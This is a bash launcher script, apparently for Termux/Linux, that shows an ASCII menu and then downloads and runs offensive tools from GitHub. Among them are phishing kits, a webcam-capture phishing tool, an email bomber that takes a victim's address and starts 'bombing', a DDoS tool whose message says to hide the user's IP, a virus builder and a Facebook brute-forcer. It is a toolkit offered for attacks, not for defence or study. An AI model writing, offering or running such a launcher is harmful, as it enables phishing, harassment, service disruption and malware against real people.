clear
mkdir Tools
clear 
echo -e '\033[31;40;1m 
 ▄▄▄▄▄▄▄▄▄▄▄  ▄               ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄ 
▐░░░░░░░░░░░▌▐░▌             ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌             ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌ 
▐░▌          ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌░▌   
▐░░░░░░░░░░░▌▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░▌    
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌░▌   
▐░▌          ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌  
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄    ▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌   ▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀     ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀
 v001



\033[33;4mVersion:\033[0m 001            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m NONO_055

\e[37m[1]\e[36m Requests & Update        \e[37m[2]\e[36m Phishing Tool				
\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan			
\e[37m[5]\e[36m Gmail Bomber		  \e[37m[6]\e[36m DDOS Attack			
\e[37m[7]\e[36m How to use ?	          \e[37m[8]\e[36m Uninstall downloaded programs		
\e[37m[9]\e[36m Ip Info	                  \e[37m[10]\e[36m dorks-eye
\e[37m[11]\e[36m HackerPro                    \e[37m[12]\e[36m RED_HAWK
\e[37m[13]\e[36m VirusCrafter                 \e[37m[14]\e[36m Info-Site
\e[37m[15]\e[36m BadMod	                  \e[37m[16]\e[36m Facebash
\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER
\e[37m[19]\e[36m url fuzzing
'


#bara chaiet


read -p ": " islem
if [[ $islem == 1 || $islem == 01 ]]; then
clear

echo -e ".......    "
echo off
sleep 5
pkg install git -y
pkg install python python3 -y
pkg install pip pip3 -y
pkg install curl -y
apt update
apt upgrade -y
clear
echo -e "fully updated..."
sleep 3
bash alhack.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
clear
echo -e "installation may take some time plz wait"
sleep 3
cd Tools
git clone https://github.com/htr-tech/zphisher
cd zphisher
bash zphisher.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
clear
echo -e "installation may take some time plz wait"
sleep 3
cd Tools
git clone https://github.com/techchipnet/CamPhish
cd CamPhish
bash camphish.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
clear
echo -e "Installation may take some time plz wait"
sleep 3
git clone https://github.com/zidansec/subscan
cd subscan
read -p "enter a domain p.sh (example.com): " sc
./subscan $sc
       
elif [[ $islem == 5 || $islem == 05 ]]; then
clear
echo -e "Installation may take some time plz wait"
sleep 3
cd Tools
git clone https://github.com/juzeon/fast-mail-bomber.git
cd fast-mail-bomber/
mv config.example.php config.php
php index.php update-providers
rm -rf data/nodes.json data/dead_providers.json
echo -e "This installation will take a long time"
echo -e "To stop, press Ctrl+C."
sleep 4
php index.php update-nodes
php index.php refine-nodes
echo "-------------------------"
read -p "Enter an email address to bombard : " mail
echo "-------------------------"
php index.php start-bombing $mail

elif [[ $islem == 6 || $islem == 06 ]]; then
clear
echo -e ""
sleep 3
cd Tools
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py
echo "Installation may take some time."
echo -e "Before using it, hide your IP."

elif [[ $islem == 7 || $islem == 07 ]]; then

echo "Didn't you know
so why did you git clone me "script kiddy"."


 
elif [[ $islem == 8 || $islem == 08 ]]; then
clear
echo -e "REMOVING DOWNLOADED PROGRAMS..."
sleep 3 
rm -rf Tools

bash alhack.sh

elif [[ $islem == 9 || $islem == 09 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
apt update
apt install git curl
git clone https://github.com/htr-tech/track-ip.git
cd track-ip
bash trackip

elif [[ $islem == 10 || $islem == 010 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
git clone https://github.com/BullsEye0/dorks-eye.git
cd dorks-eye
pip install -r requirements.txt
python3 dorks-eye.py

elif [[ $islem == 11 || $islem == 011 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
apt update && apt upgrade && apt install git && apt install python2
git clone https://github.com/jaykali/hackerpro.git
cd hackerpro
sudo bash install.sh
python2 hackerpro.py

elif [[ $islem == 12 || $islem == 012 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
git clone https://github.com/Tuhinshubhra/RED_HAWK
cd RED_HAWK
php rhawk.php

elif [[ $islem == 13 || $islem == 013 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
git clone https://github.com/Devil-Tigers/TigerVirus
apt update
apt upgrade -y
pkg install git -y
cd TigerVirus
bash app.sh

elif [[ $islem == 14 || $islem == 014 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
pkg install curl -y
upgrade -y
pkg install git -y
git clone https://github.com/king-hacking/info-site.git
cd info-site
bash info.sh

elif [[ $islem == 15 || $islem == 015 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
sudo apt-get update
sudo apt-get install php
sudo apt-get install php-curl
git clone https://github.com/MrSqar-Ye/BadMod.git
cd BadMod
chmod u+x INSTALL
chmod u+x BadMod.php
sudo php BadMod.php

elif [[ $islem == 16 || $islem == 016 ]]; then
clear
echo -e "Installation may take some time."
sleep 3
cd Tools
if [[ -d "facebash" ]]; then
    echo "yo mother fucker it does exist !!!"
else
    git clone https://github.com/fu8uk1/facebash
fi

elif [[ $islem == 18 || $islem == 018 ]]; then
clear
echo -e "Installation may take some time."
echo -e "This tool will require you to be (ROOT)"
sleep 3
cd Tools
sudo apt-get install tor -y
sudo pip3 install requests
git clone https://github.com/FDX100/Auto_Tor_IP_changer.git
cd Auto_Tor_IP_changer
echo -e "Go to your browser / change the proxy (sock proxy) to 127.0.0.1:9050"
sleep 8
python3 install.py
aut

elif [[ $islem == 19 || $islem == 019 ]]; then
clear
git clone https://github.com/kkrypt0nn/wordlists.git
sudo apt install gobuster -y
read -p "Enter the URL to fuzz: " url
cd wordlists/wordlists/discovery || exit 1
gobuster dns -d "$url" -w common.txt
gobuster dns -d "$url" -w big.txt
gobuster dns -d "$url" -w directories.txt

else   
	clear
    echo -e 'get out'	
	sleep 1
	clear 
	bash alhack.sh
fi